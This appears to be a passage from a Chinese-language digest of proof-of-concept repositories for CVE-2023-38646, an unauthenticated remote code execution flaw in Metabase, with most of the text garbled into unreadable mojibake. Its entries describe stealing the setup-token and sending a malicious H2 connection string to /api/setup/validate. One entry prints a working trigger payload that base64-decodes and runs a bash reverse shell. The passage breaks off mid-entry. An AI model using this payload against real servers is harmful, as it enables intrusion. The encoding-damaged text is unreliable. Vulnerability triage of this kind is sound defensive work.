**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

